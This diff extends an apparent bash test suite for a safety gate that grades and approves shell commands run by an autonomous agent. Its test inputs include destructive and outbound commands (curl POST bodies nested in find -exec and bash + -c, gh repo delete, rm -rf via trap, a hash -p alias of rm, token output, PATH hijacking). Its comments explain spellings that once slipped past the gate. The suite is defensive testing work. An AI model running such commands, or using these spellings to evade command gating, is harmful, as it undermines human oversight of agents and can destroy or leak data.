@@ -1256,6 +1256,25 @@ HH7() { cd "$WT" && XDG_STATE_HOME="$STATE7" gate_inproc snapshot --manifest "$F
 PD() { cd "$WT" && gate_inproc snapshot --manifest "$FX_MANIFEST" --render 2>/dev/null \
        | sed -n 's/^진전 해시 : //p' | sed 's/[[:space:]]*$//'; }
 
+# The id of the approval most recently issued that is STILL pending — the last
+# row of that id reads `상태=대기`, the way `gate_approval_state` reads it. The
+# last `상태=대기` line of the ledger is not that: an id issued by an earlier
+# section and resolved since keeps its old `대기` line, and picking it hands a
+# resolved approval to a section that means to close a pending one.
+pending_approval_id() {
+  grep -E '^- `승인`' "$1" | awk -F ' [|] ' '
+    { id = ""; st = ""
+      for (i = 1; i <= NF; i++) {
+        f = $i; sub(/[[:space:]]+$/, "", f)
+        if (f ~ /^승인 id=/) { sub(/^승인 id=/, "", f); id = f }
+        else if (f ~ /^상태=/) { sub(/^상태=/, "", f); st = f }
+      }
+      if (id != "") { last[id] = st; seen[id] = NR } }
+    END { best = ""; n = 0
+          for (k in last) if (last[k] == "대기" && seen[k] > n) { n = seen[k]; best = k }
+          print best }'
+}
+
 # THE TRANSCRIPT FIXTURE IS THE HARNESS'S SHAPE, NOT A ONE-LINE STAND-IN.
 # `close` reads an answer by FRAME: the line must be the `tool_result` of an
 # `AskUserQuestion` whose question carried the approval id, joined through
@@ -2814,6 +2833,27 @@ pre_sb() {
     # sb_row <세그먼트> — 그 세그먼트의 마지막 `결정=act` 자율 승인 행.
     { grep -F '`자율 승인`' "$SA_LEDGER" 2>/dev/null || true; } \
       | grep -F "세그먼트=$1 " | grep -F '결정=act' | tail -1
+  }
+}
+
+# `parse` — the sections that read the argv parser. They stand on no fixture
+# state, so their prelude is one helper: the minimal manifest the two rules that
+# read argv take as input. It lives here rather than in the first section that
+# used it because a second section now calls it, and a helper defined inside a
+# section dies as `command not found` in a cut that does not name that section.
+pre_parse() {
+  [ -n "${PRE_PARSE_DONE:-}" ] && return 0
+  PRE_PARSE_DONE=1
+
+  sp_man() {
+    # sp_man <파일> <형태...> — 사전 인가 행만 담은 최소 매니페스트. 대조 룰은
+    # 그 행만 읽으므로 런 정체도 대상도 필요하지 않다.
+    local f="$1" shape
+    shift
+    : > "$f"
+    for shape in "$@"; do
+      printf -- '- `사전 인가` | 형태=%s | 사유=테스트\n' "$shape" >> "$f"
+    done
   }
 }
 
@@ -4730,6 +4770,15 @@ fi
 for a in $(grep -oE '승인 id=[^ |]+' "$FX_LEDGER" | sed 's/승인 id=//' | sort -u); do
   printf -- '- `승인` | 승인 id=%s | 상태=승인 | 해소 시각=%s | prev=x\n' "$a" "테스트" >> "$FX_LEDGER"
 done
+# AN EARLIER SECTION MAY ALREADY HAVE FIRED B1 ON THIS VERY DIGEST. Section 6's
+# acts do, on a shard that runs it first: the id is a hash of the binding, the
+# loop above just answered it, and `boundary-B1.asked` still equals the binding,
+# so the answered arm keeps B1 quiet here and 13 and 14 are handed nothing to
+# close. Clearing the marker is the state a recurrence leaves — the binding
+# moved away and came back — which is the state in which an answered B1 asks
+# again, so this section issues its own approval whatever ran before it.
+rm -f "$RD/boundary-B1.asked"
+b1_issued_before=$(grep -c '구속 튜플=B1' "$FX_LEDGER" || true)
 
 # `RD` is set in `pre_base`, in the head.
 printf '%s\n' "$(PD)" > "$RD/progress-digest"
@@ -4749,7 +4798,10 @@ printf '%s\n' "$( { grep -c '^- `' "$FX_LEDGER" || true; } | tr -d ' ')" > "$RD/
 H=$(cd "$WT" && gate_inproc snapshot --manifest "$FX_MANIFEST" 2>/dev/null | jq -r .H)
 gate act --manifest "$FX_MANIFEST" --kind x --target front --cutpoint 커밋 \
      --snapshot-digest "$(HH)" --rationale "S9" -- touch "$WORK/t2"
-if grep -q '구속 튜플=B1' "$FX_LEDGER"; then
+# COUNTED, NOT GREPPED: a row an earlier section wrote satisfies a bare `grep -q`
+# without this section's act having fired anything.
+if [ "$(grep -c '구속 튜플=B1' "$FX_LEDGER" || true)" -gt "$b1_issued_before" ] \
+   && [ -n "$(pending_approval_id "$FX_LEDGER")" ]; then
   ok "B1 이 발동하면 park 이 아니라 승인 대기를 발행한다"
 else
   bad "B1" "무진전이 연속으로 쌓였는데 경계 승인이 없다"
@@ -4781,8 +4833,7 @@ check "열린 승인이 있는 동안 경계는 다시 발동하지 않는다" "
 # boundary approval pending, which is what puts this block on the `if` arm in a
 # serial run; a section that reaches here without one is a broken precondition
 # and must say so.
-aid=$(grep -E '^- `승인`' "$FX_LEDGER" | grep '상태=대기' | tail -1 \
-      | grep -oE '승인 id=[^ |]+' | sed 's/승인 id=//' || true)
+aid=$(pending_approval_id "$FX_LEDGER")
 if [ -n "$aid" ]; then
   gate close --manifest "$FX_MANIFEST" --approval "$aid"
   check "트랜스크립트가 없으면 승인은 닫히지 않는다" "$rc" "5"
@@ -4845,8 +4896,7 @@ fi
 # ---------------------------------------------------------------------------
 # Same shape as section 13: with no pending approval the four assertions below
 # used to vanish rather than fail, so the `else` arm now records the absence.
-vaid=$(grep -E '^- `승인`' "$FX_LEDGER" | grep '상태=대기' | tail -1 \
-       | grep -oE '승인 id=[^ |]+' | sed 's/승인 id=//' || true)
+vaid=$(pending_approval_id "$FX_LEDGER")
 if [ -n "$vaid" ]; then
   vq=$(grep -E '^- `승인`' "$FX_LEDGER" | grep -F "승인 id=$vaid " | tail -1 \
        | tr '|' '\n' | sed -n 's/^ *질문 문면=//p' | sed 's/[[:space:]]*$//' | tail -1)
@@ -7708,9 +7758,12 @@ graded_as '읽기'         '경로로 부른 git 읽기도 같다'              
 graded_as '워크트리쓰기' 'git -C 의 하위 명령을 찾아낸다'   -- git -C /tmp commit -m x
 graded_as '외부상태변경' 'git -c 의 하위 명령도 찾아낸다'   -- git -c user.name=x push
 graded_as '읽기'         '값이 붙은 전역 옵션도 건너뛴다'   -- git --git-dir=/tmp/.git log
-# An unrecognized global stops the scan as UNKNOWN rather than guessing whether
-# it eats the next word — guessing wrong grades a `push` by the wrong token.
-graded_as '등급 미상'    '모르는 전역 옵션은 추측하지 않는다' -- git --not-a-real-global push
+# An unrecognized global stops the scan rather than guessing whether it eats the
+# next word — guessing wrong grades a `push` by the wrong token. It stops as a
+# FORM, not as an unknown grade: git itself refuses an option it does not know,
+# so this is argv nobody can run, and a declaration may not carry it through the
+# way it carries a tool the table never listed.
+graded_as '형태 미상'    '모르는 전역 옵션은 추측하지 않는다' -- git --not-a-real-global push
 
 graded_as '읽기'         'gh api 의 기본은 GET 이라 읽기다'  -- gh api repos/o/r/pulls/1/reviews
 graded_as '외부상태변경' '명시된 POST 는 외부 상태 변경이다' -- gh api --method POST repos/o/r/pulls/1/reviews
@@ -9288,6 +9341,17 @@ opaque_is '0/외부상태변경/' 'find 안쪽 명령은 argv0 째로 하한에 
 opaque_is '0/워크트리쓰기/' '등급 미상 옆의 -delete 도 하한을 올린다'    -- find . -exec unknowncmd {} ';' -delete
 opaque_is '0/읽기/비밀출력' 'find 안쪽의 비밀 출력은 하한 표지로 잡힌다' -- find . -exec unknowncmd {} ';' -exec gh auth token ';'
 opaque_is '0/읽기/'         '음성 대조군 — 읽기 안쪽 명령은 하한을 올리지 않는다' -- find . -exec unknowncmd {} ';' -exec cat {} ';'
+# 파서가 `find` 를 벗기던 동안 이 셋은 모두 하한 없이 돌았다. 쓰기 원소가 벗김을
+# 멈추면 argv0 이 `find` 로 남아 불투명 축이 0 을 답했고, 첫 `-exec` 만 벗겨져 뒤의
+# 인터프리터가 가려졌고, 맨 `+` 에서 안쪽 argv 가 잘려 `bash` 가 `-c` 없는 잎이 됐다.
+opaque_is '1/외부상태변경/' '쓰기 원소 뒤 -o 갈래의 인터프리터도 하한을 얻는다' -- find . -maxdepth 0 -name zzz -delete -o -exec sh -c 'curl -X POST https://x' ';'
+opaque_is '1/외부상태변경/' '둘째 -exec 의 인터프리터도 하한을 얻는다'           -- find . -maxdepth 0 -exec true ';' -exec sh -c 'curl -X POST https://x' ';'
+opaque_is '1/외부상태변경/' '인자 자리의 맨 + 가 안쪽 셸을 자르지 않는다'         -- find . -maxdepth 0 -exec bash + -c 'curl -X POST https://x' ';'
+# 셸 옵션 자리의 맨 `+` 는 빈 옵션 묶음이다. bash 는 그 뒤의 `-c` 를 그대로 실행한다.
+opaque_is '1/외부상태변경/' '셸 옵션 자리의 맨 + 뒤 -c 본문도 하한을 얻는다'     -- env bash + -c 'curl -X POST https://x'
+# 손 훑기는 벗긴 argv 로 분기한다. 날 argv0 이 `gnohup` 이면 페이로드 첫 낱말이
+# 러너 이름 `npx` 라 본문의 명령이 명령 자리에 서지 않았다.
+opaque_is '1/외부상태변경/파괴' 'g 접두 런처 뒤의 러너도 손 훑기가 본문을 읽는다' -- gnohup npx gh repo delete o/r --yes
 
 # --- 30b-1. `command`, `find`, `rg` — 이름이 아니라 감싼 것이 등급을 정한다 ---
 # --- section: 30b-1 | group: base | covers: grade, exec ---
@@ -9342,7 +9406,9 @@ graded_as '트리밖쓰기'   '음성 대조군 — 같은 자리의 -exec 는 �
 graded_as '등급 미상'    '등급 미상 primary 는 뒤의 읽기 primary 에 지워지지 않는다' -- find . -exec unknowncmd {} \; -exec cat {} \;
 graded_as '등급 미상'    '순서를 뒤집어도 같다'                        -- find . -exec cat {} \; -exec unknowncmd {} \;
 graded_as '등급 미상'    '단일 primary 대조군 — 모르는 안쪽 명령은 등급 미상이다' -- find . -exec unknowncmd {} \;
-graded_as '등급 미상'    '형태가 깨진 git 도 뒤의 읽기 primary 에 지워지지 않는다' -- find . -exec git --upload-pack=x fetch {} \; -exec cat {} \;
+# git 의 전역 자리에 선 모르는 옵션은 파서의 전역 스캐너가 `형태 미상` 으로 답한다.
+# 그 답도 `등급 미상` 과 같이 옆 primary 에 지워지지 않아야 한다.
+graded_as '형태 미상'    '형태가 깨진 git 도 뒤의 읽기 primary 에 지워지지 않는다' -- find . -exec git --upload-pack=x fetch {} \; -exec cat {} \;
 graded_as '형태 미상'    '-execdir 뒤에 읽기 primary 가 와도 형태 미상이다' -- find . -execdir rm {} \; -exec cat {} \;
 graded_as '형태 미상'    '안쪽 find 의 형태 미상도 옆 primary 에 지워지지 않는다' -- find . -exec find . -execdir rm {} \; -exec cat {} \;
 # `+` 는 `{}` 바로 뒤에서만 `-exec` 를 끝낸다. 그 밖의 `+` 는 안쪽 명령의 인자인데
@@ -19336,10 +19402,19 @@ gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커�
   --surface 워크트리쓰기 --reach 런로컬 --snapshot-digest "$(HH)" \
   --rationale t -- sh -c 'cd x && git push origin b'
 check "셸 문자열 안의 push 가 하한을 올려 저선언이 된다" "$rc" "6"
+# 몸통이 읽기뿐이어도 `읽기` 신고는 받아들여지지 않는다. 하한은 표가 이미 증명한
+# 것에 **더할** 뿐 그것을 대체하지 않으므로, 셸이 돌았다는 표의 답이 바닥으로
+# 남는다. 대체하던 시절에는 하한이 표의 답보다 낮을 때 등급이 함께 끌어내려져,
+# 표 혼자였다면 거절했을 신고가 하한을 이유로 통과했다 — 하한은 읽어낸 만큼을
+# 보태는 진술이지 읽어내지 못한 만큼을 깎는 진술이 아니다.
 gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커밋 \
   --surface 읽기 --reach 런로컬 --snapshot-digest "$(HH)" \
   --rationale t -- sh -c 'cat base.txt'
-check "읽기만 하는 셸 문자열은 읽기 선언이 받아들여진다" "$rc" "0"
+check "읽기만 하는 셸 문자열도 하한이 표의 답을 끌어내리지 못한다" "$rc" "6"
+gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커밋 \
+  --surface 워크트리쓰기 --reach 런로컬 --snapshot-digest "$(HH)" \
+  --rationale t -- sh -c 'cat base.txt'
+check "표의 답으로 신고한 같은 셸 문자열은 통과한다" "$rc" "0"
 # 두 거절이 순서대로 선다. 하한이 먼저 보이는 것은 `xargs git push` 의 인자 목록
 # 안에서 push 가 읽히기 때문이고(저선언 → exit 6), 정직하게 올려 신고하면 그때는
 # 풀리지 않는 래퍼라는 이유로 park 된다. 둘 다 거절이지만 처방이 다르므로 둘 다
@@ -19437,6 +19512,682 @@ case "$msg" in
   *) bad "그 거부가 리뷰 룰의 것이다" "$msg" ;;
 esac
 CC_CMDS_AUTOPILOT_AUTO_RESOLVE="$CC_GATE_PREV_AR55"
+
+# ---------------------------------------------------------------------------
+# 62. 하한이 비교기 밖으로 나온다 — grade 둘째 줄·표면·도달·원장
+# --- section: 62 | group: reach | covers: grade, exec | anchors: 62: grade 가 하한을 둘째 줄에 찍는다, 62: 조각이 없는 행위는 하한 줄을 찍지 않는다, 62: 자동 해소를 꺼도 하한이 비교기에 선다, 62: 행 없는 도구 조각이 하한을 올린다, 62: 조각 없이 리다이렉션만 있는 몸통도 하한이 정의된다, 62: 목록에 없는 셸 단어 조각은 하한을 올린다, 62: 원장 행이 하한을 싣는다 ---
+#
+# 하한은 몸통에서 게이트가 실제로 읽어낸 부분이고, 오늘까지 그 값은 비교기
+# 지역 변수 밖으로 한 번도 나가지 않았다. 그래서 `bash -c 'gh repo delete …'`
+# 는 룰에게 셸의 워크트리 쓰기로 보였다. 이 절은 그 값이 나가는 네 자리를
+# 각각 못박는다 — `grade` 둘째 줄, 비교기, 도달 필요, 원장 행.
+# ---------------------------------------------------------------------------
+s62() {
+  # s62 <본문> — 절 61 과 같은 틀. 소싱만 하고 픽스처는 쓰지 않는다.
+  ( cd "$repo_root" && CC_GATE_SOURCE_ONLY=1 S62_GATE="$GATE" S62_BODY="$1" \
+      /bin/bash -c '
+      . "$S62_GATE" </dev/null
+      unset CC_GATE_SOURCE_ONLY
+      trap - EXIT ERR INT TERM
+      set +e
+      set -u
+      F() { printf "%s\n" "$(gate_opaque_floor "$@" | cut -f1)"; }
+      D() { if gate_floor_defined "$@"; then printf "1\n"; else printf "0\n"; fi; }
+      G() { printf "%s\n" "$(surface_of_argv0 "$@")"; }
+      R() { GATE_FLOOR="$1"; shift; GATE_GRADE_SOURCE=표
+            if gate_reach_required "$@"; then printf "1\n"; else printf "0\n"; fi; }
+      eval "$S62_BODY"' 2>/dev/null )
+}
+
+# (1) `grade` 의 둘째 줄. 호출자가 무엇을 신고해야 하는지 물어보는 자리이므로,
+# 셸 본문에 대해서는 셸의 행이 아니라 비교기가 들이댈 하한이 답이다.
+g62=$(cd "$WT" && bash "$GATE" grade --manifest "$FX_MANIFEST" --target front \
+        -- sh -c 'gh repo delete o/r --yes' 2>/dev/null)
+check "62: grade 가 하한을 둘째 줄에 찍는다" "$g62" "축2=워크트리쓰기
+하한=외부상태변경"
+# 조각이 없는 행위에는 필드 자체가 없다 — 빈 값으로 두면 「계산했는데 아무것도
+# 아니었다」로 읽히고, 그 독해가 아침 보고에서 가장 비싸다.
+g62=$(cd "$WT" && bash "$GATE" grade --manifest "$FX_MANIFEST" --target front \
+        -- gh repo delete o/r --yes 2>/dev/null)
+check "62: 조각이 없는 행위는 하한 줄을 찍지 않는다" "$g62" "축2=외부상태변경"
+check "62: 스크립트 파일 피연산자는 조각이 아니다" \
+  "$(s62 'D sh foo.sh; D sh -c "gh repo delete o/r --yes"')" "0
+1"
+
+# (2) 행 없는 도구 조각. 옛 승격 루프는 네 실등급만 올리고 `등급 미상` 조각을
+# 조용히 건너뛰어, 등록되지 않은 도구만으로 된 몸통이 `읽기` 로 바닥났다 —
+# 게이트가 가장 모르는 경우에 가장 넓은 답을 주던 자리다.
+check "62: 행 없는 도구 조각이 하한을 올린다" \
+  "$(s62 'F sh -c "unknowntool --wipe; true"')" "외부상태변경"
+check "62: 내장 명령 조각은 하한을 올리지 않는다" \
+  "$(s62 'F sh -c "cd wt && echo hi"')" "읽기"
+# 내장 명령도 리다이렉션으로 파일을 쓴다. 그 쓰기가 하한에 들지 않으면 읽기로
+# 신고한 `sh -c "cat a > <어디든>"` 이 비교기를 지난다.
+check "62: 파일로 가는 리다이렉션은 하한을 올린다" \
+  "$(s62 'F sh -c "cat a > /outside/x"; F sh -c "echo hi >> log"')" "워크트리쓰기
+워크트리쓰기"
+check "62: 버리는 리다이렉션은 하한을 올리지 않는다" \
+  "$(s62 'F sh -c "cat a 2>/dev/null"; F sh -c "cat a 2>&1"')" "읽기
+읽기"
+check "62: 쓰는 조각이 하나라도 있으면 그 최대가 하한이다" \
+  "$(s62 'F sh -c "echo hi && git push origin HEAD"')" "외부상태변경"
+# 리다이렉션만 있고 명령어 자체가 없는 몸통 — `sh -c "> /outside/x"` — 은 조각이
+# 하나도 서지 않는데 하한은 이미 올라가 있다. 「하한이 정의된 행위인가」를 조각
+# 수로만 답하던 자리는 그 몸통에 「하한 없음」을 답했고, 올려 둔 값은 비교기까지만
+# 가고 원장 필드와 `grade` 둘째 줄에는 닿지 못했다.
+check "62: 조각 없이 리다이렉션만 있는 몸통도 하한이 정의된다" \
+  "$(s62 'F sh -c "> /outside/x"; D sh -c "> /outside/x"')" "워크트리쓰기
+1"
+# 셸 키워드라고 다 아는 것은 아니다. 목록에 없는 단어는 `등급 미상` 조각이고,
+# 하한이 `읽기` 로 떨어지면 나중에 도는 몸통을 실은 `trap` 이 읽기 신고로
+# 비교기를 지난다.
+check "62: 목록에 없는 셸 단어 조각은 하한을 올린다" \
+  "$(s62 'F sh -c "trap \"rm -rf x\" EXIT"; F sh -c "compgen -C \"gh repo delete o/r --yes\" -A command"')" \
+  "외부상태변경
+외부상태변경"
+check "62: 목록에 있는 조회 내장은 하한을 올리지 않는다" \
+  "$(s62 'F sh -c "type ls"; F sh -c "pwd"')" "읽기
+읽기"
+# `hash` 는 명령 문자열을 싣지 않지만 `hash -p <경로> <이름>` 은 뒤의 `<이름>`
+# 이 실행할 파일을 바꾼다. 읽기 목록에 있던 동안 `cat` 으로 적힌 `rm` 이 읽기
+# 하한으로 지났다.
+check "62: 실행 신원을 바꾸는 hash 는 하한을 올린다" \
+  "$(s62 'F sh -c "hash -r"; F sh -c "hash -p /bin/rm cat; cat -rf somedir"')" \
+  "외부상태변경
+외부상태변경"
+# `read`·`printf -v` 는 줄에 없는 값으로 이름을 세운다. 그 이름이 `PATH` 면 뒤
+# 낱말이 실행하는 것이 바뀌므로, 줄에 적힌 `PATH=` 와 같은 형태 거절을 받는다.
+check "62: 줄에 없는 값으로 실행 신원 이름을 세우는 내장은 형태 미상이다" \
+  "$(s62 'gp_parse sh -c "read PATH; ls"; printf "%s %s\n" "$GP_STATUS" "$GP_REASON"
+          gp_parse sh -c "printf -v PATH %s /tmp; ls"; printf "%s %s\n" "$GP_STATUS" "$GP_REASON"
+          gp_parse sh -c "read line; ls"; printf "%s\n" "$GP_STATUS"')" \
+  "form env:exec-identity:PATH
+form env:exec-identity:PATH
+list"
+# `NAME+=value` 도 대입이다 — 셸은 덧붙이고, 설정되지 않은 이름에서는 그냥
+# 대입이다. `export` 갈래가 첫 `=` 에서 자른 `PATH+` 를 그대로 환경 표에 물었던
+# 동안 어느 행에도 맞지 않아, 실행 신원을 바꾸는 대입이 분류 없이 지났다.
+check "62: += 로 덧붙이는 대입도 같은 이름으로 분류된다" \
+  "$(s62 'gp_parse sh -c "export PATH+=/x; ls"; printf "%s %s\n" "$GP_STATUS" "$GP_REASON"
+          gp_parse sh -c "PATH+=/x ls"; printf "%s %s\n" "$GP_STATUS" "$GP_REASON"
+          gp_parse sh -c "export GIT_SSH_COMMAND+=x; git status"
+          printf "%s\n" "${GP_ENV[@]}" | grep -c "^GIT_SSH_COMMAND=x\$"
+          gp_parse sh -c "export A+B=x; ls"; printf "%s\n" "$GP_STATUS"')" \
+  "form env:exec-identity:PATH
+form env:exec-identity:PATH
+1
+form"
+
+# 몸통 안에서 디렉터리를 옮긴 행위도 같은 하한을 받고, 옮겼다는 사실 자체가
+# 파서에 남는다 — 암묵 저장소가 대상의 것인지는 그 자리에서 알 수 없다.
+check "62: 디렉터리를 옮긴 몸통도 하한과 옮김을 함께 남긴다" \
+  "$(s62 'gp_parse bash -c "cd /x && gh repo delete o/r --yes"; printf "%s\n" "$GP_CWD"; F bash -c "cd /x && gh repo delete o/r --yes"')" \
+  "/x
+외부상태변경"
+check "62: 옮긴 뒤의 암묵 저장소는 대상의 것으로 치지 않는다" \
+  "$(s62 'target_field(){ printf o/r; }
+          gp_parse env --chdir=/x gh pr merge 1
+          if gate_gh_repo_is_target tgt; then printf "1\n"; else printf "0\n"; fi
+          gp_parse gh pr merge 1
+          if gate_gh_repo_is_target tgt; then printf "1\n"; else printf "0\n"; fi')" \
+  "0
+1"
+
+# (3) 비교기. 하한이 자동 해소 모드의 호의가 아니라는 것 — 끈 모드는 런이
+# 게이트를 더 엄하게 하려고 고르는 모드인데, 거기서만 셸의 표 등급이 상한으로
+# 서서 `워크트리쓰기` 신고가 그대로 통과했다.
+CC_GATE_PREV_AR62="${CC_CMDS_AUTOPILOT_AUTO_RESOLVE:-}"
+CC_CMDS_AUTOPILOT_AUTO_RESOLVE=0
+gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커밋 \
+  --surface 워크트리쓰기 --reach 런로컬 --snapshot-digest "$(HH)" \
+  --rationale t -- sh -c 'gh repo delete o/r --yes'
+check "62: 자동 해소를 꺼도 하한이 비교기에 선다" "$rc" "6"
+CC_CMDS_AUTOPILOT_AUTO_RESOLVE=1
+gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커밋 \
+  --surface 워크트리쓰기 --reach 런로컬 --snapshot-digest "$(HH)" \
+  --rationale t -- sh -c 'gh repo delete o/r --yes'
+check "62: 켠 모드도 같은 하한을 쓴다" "$rc" "6"
+CC_CMDS_AUTOPILOT_AUTO_RESOLVE="$CC_GATE_PREV_AR62"
+# 리다이렉션이 올린 하한도 같은 비교기에 선다. 거절이 실행 전이라 대상 파일은
+# 만들어지지 않지만, 혹시 지나더라도 픽스처의 작업 디렉터리 안에만 떨어진다.
+gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커밋 \
+  --surface 읽기 --reach 런로컬 --snapshot-digest "$(HH)" \
+  --rationale t -- sh -c "cat base.txt > $WORK/s62-redir.out"
+check "62: 리다이렉션으로 쓰는 몸통을 읽기로 신고하면 거절된다" "$rc" "6"
+[ ! -e "$WORK/s62-redir.out" ] && ok "62: 거절된 리다이렉션은 파일을 만들지 않는다" \
+  || bad "62: 거절된 리다이렉션은 파일을 만들지 않는다" "rc=$rc"
+# `find` 의 안쪽 셸도 같은 비교기에 선다. 파서가 `find` 를 벗기고 맨 `+` 를
+# 종단자와 옵션 끝으로 읽던 동안, 이 철자는 `-c` 없는 `bash` 잎으로 읽혀 하한이
+# 계산되지 않았고 워크트리 쓰기 신고로 본문이 수행됐다. 본문의 요청은 닫힌 로컬
+# 포트로 가고 나머지는 픽스처 작업 디렉터리 안의 파일 하나라, 거절되지 않더라도
+# 밖으로 나가는 것이 없다.
+gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커밋 \
+  --surface 워크트리쓰기 --reach 런로컬 --snapshot-digest "$(HH)" \
+  --rationale t -- find . -maxdepth 0 -exec bash + -c "curl -X POST http://127.0.0.1:9/; touch $WORK/s62-find.out" ';'
+check "62: find 안쪽의 bash + -c 본문도 하한으로 거절된다" "$rc" "6"
+[ ! -e "$WORK/s62-find.out" ] && ok "62: 거절된 find 본문은 실행되지 않는다" \
+  || bad "62: 거절된 find 본문은 실행되지 않는다" "rc=$rc"
+
+# (4) 도달 필요. 셸의 행은 셸이 돌았다고만 말하고, 저장소를 지우는 몸통은
+# 어디에 떨어지는지 적을 자리가 있어야 한다.
+check "62: 하한이 도달 필요를 끌어올린다" \
+  "$(s62 'R 외부상태변경 워크트리쓰기 sh -c "gh repo delete o/r --yes"; R 읽기 워크트리쓰기 sh -c "cat x"')" \
+  "1
+0"
+
+# (5) 원장. 하한이 있는 행위의 행에만 실리고, 없는 행위의 행에는 필드가 없다.
+gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커밋 \
+  --surface 워크트리쓰기 --reach 런로컬 --snapshot-digest "$(HH)" \
+  --rationale t -- sh -c 'git add .'
+n=$(grep -c '하한=워크트리쓰기' "$FX_LEDGER" 2>/dev/null || true)
+[ "${n:-0}" -ge 1 ] && ok "62: 원장 행이 하한을 싣는다" || bad "62: 원장 행이 하한을 싣는다" "n=$n rc=$rc"
+gate exec --manifest "$FX_MANIFEST" --target front --segment S1 --cutpoint 커밋 \
+  --surface 읽기 --reach 런로컬 --snapshot-digest "$(HH)" --rationale t -- cat base.txt
+n=$(grep -c 'argv=cat base.txt' "$FX_LEDGER" 2>/dev/null || true)
+m=$(grep 'argv=cat base.txt' "$FX_LEDGER" 2>/dev/null | grep -c '하한=' || true)
+[ "${n:-0}" -ge 1 ] && [ "${m:-0}" = "0" ] \
+  && ok "62: 조각 없는 행위의 행에는 하한 필드가 없다" \
+  || bad "62: 조각 없는 행위의 행에는 하한 필드가 없다" "n=$n m=$m"
+
+# ---------------------------------------------------------------------------
+# 63. git 전역 문법과 push 원격 결속
+# --- section: 63 | group: reach | covers: grade, exec | anchors: 63: -C 뒤의 부명령이 등급을 정한다, 63: remote 재지정 -c 는 형태 미상이다, 63: 협업 팔이 push·pull·fetch 를 인정한다, 63: 전역 옵션은 사전 인가 형태에서 빠진다, 63: 원격은 -C 디렉터리에서 해소된다, 63: 빈 URL 은 통과가 아니라 불일치다, 63: -C 뒤의 남의 URL push 는 도달 판정에서 멈춘다, 63: --repo 로 적은 원격도 슬러그로 대조한다, 63: 외래 호스트의 대상 슬러그는 불일치다, 63: 상대 -C 는 행위 디렉터리에서 접히고 두 번이면 누적된다, 63: 그 유도가 세그먼트 워크트리의 브랜치에서 나온다 ---
+#
+# 한 워크트리에서 다른 워크트리로 push 하는 철자 — `git -C <wt> push` — 는
+# 등급에서 읽히지 않고, 읽히더라도 원격이 게이트가 선 디렉터리에서 해소됐다.
+# 그래서 같은 이름의 `origin` 을 가진 다른 저장소가 대상 행의 슬러그로 대답했다.
+# 이 절은 그 철자가 지나는 네 자리 — 등급표, 협업 팔, 사전 인가 형태, push
+# 원격 — 를 각각 못박고, 문법을 넓힌 대가로 열릴 뻔한 자리(`-c` 로 원격 자체를
+# 재지정하는 것)가 닫혀 있는지 함께 본다.
+# ---------------------------------------------------------------------------
+s63() {
+  # s63 <본문> — 절 62 와 같은 틀. `target_field` 는 대상 행 없이 슬러그만
+  # 필요한 자리이므로 소싱 뒤에 덮어쓴다.
+  ( cd "$repo_root" && CC_GATE_SOURCE_ONLY=1 S63_GATE="$GATE" S63_BODY="$1" \
+      /bin/bash -c '
+      . "$S63_GATE" </dev/null
+      unset CC_GATE_SOURCE_ONLY
+      trap - EXIT ERR INT TERM
+      set +e
+      set -u
+      target_field() { printf o/r; }
+      G() { printf "%s\n" "$(surface_of_argv0 "$@")"; }
+      B() { GATE_GRADE_SOURCE=표; gp_parse "$@"
+            if gate_collaboration_surface tgt 협업 "$@"; then printf "1\n"; else printf "0\n"; fi; }
+      C() { gp_parse "$@"; gp_canon; }
+      P() { local d="$1"; shift; GATE_ACT_CWD="$d"; gp_parse "$@"
+            if gate_push_remote_match tgt "$@"; then printf "1\n"; else printf "0\n"; fi; }
+      # `Q <dir> <argv...>` 는 도달 판정을 끝까지 돈다 — 원격 대조만 따로 부르면
+      # 판정이 그 대조까지 가는지는 재지 못한다. 대상 행은 필드마다 답한다.
+      Q() { local d="$1"; shift
+            ( target_field() {
+                case "$2" in
+                  "원격 슬러그") printf o/r ;;
+                  "베이스 브랜치") printf master ;;
+                  *) return 1 ;;
+                esac; }
+              GATE_ACT_CWD="$d" GATE_REACH="${QR:-협업}" GATE_GRADE_SOURCE=표 GATE_MARK="" \
+              GATE_MARK_TRIGGER="" GATE_DECLARED=외부상태변경 MANIFEST="$d/없는-매니페스트"
+              gp_parse "$@"
+              local o; o=$(gate_reach_disposition tgt 0 외부상태변경 "$@")
+              printf "%s\n" "${o:-통과}" ) }
+      K() { local d="$1"; shift
+            ( target_field() { case "$2" in "베이스 브랜치") printf master ;; *) return 1 ;; esac; }
+              GATE_ACT_CWD="$d"; printf "%s\n" "$(gate_push_rung tgt "$@")" ) }
+      # `D <dir> <argv...>` 는 몸통·`find` 아래의 push 조각 목록을 탭 대신 공백으로 낸다.
+      D() { local d="$1"; shift
+            ( target_field() {
+                case "$2" in
+                  "원격 슬러그") printf o/r ;;
+                  "베이스 브랜치") printf master ;;
+                  *) return 1 ;;
+                esac; }
+              GATE_ACT_CWD="$d"; gate_push_pieces tgt "$@" | tr "\t" " " ) }
+      # `L <dir> <매니페스트> <argv...>` 는 불투명 부류로 사전 인가 전송을 싣고
+      # 도달 판정을 끝까지 돈다 — 상한이 풀린 뒤의 칸까지 가는지를 잰다.
+      L() { local d="$1" man="$2"; shift 2
+            ( target_field() {
+                case "$2" in
+                  "원격 슬러그") printf o/r ;;
+                  "베이스 브랜치") printf master ;;
+                  *) return 1 ;;
+                esac; }
+              GATE_ACT_CWD="$d" GATE_REACH="${QR:-dev}" GATE_GRADE_SOURCE=불투명 GATE_MARK="" \
+              GATE_MARK_TRIGGER="" GATE_DECLARED=외부상태변경 MANIFEST="$man"
+              gate_preauth_export tgt "$@"
+              local o; o=$(gate_reach_disposition tgt 0 외부상태변경 "$@")
+              printf "%s\n" "${o:-통과}" ) }
+      eval "$S63_BODY"' 2>/dev/null )
+}
+
+# (1) 등급표. 전역 옵션은 건너뛰고 부명령이 등급을 정한다 — 건너뛰지 못하면
+# 첫 단어가 `-C` 라서 행이 없고, 행이 없는 git 은 선언으로 구제되는 `등급 미상`
+# 이 됐다.
+check "63: -C 뒤의 부명령이 등급을 정한다" \
+  "$(s63 'G git -C /w push -u origin b:b')" "외부상태변경"
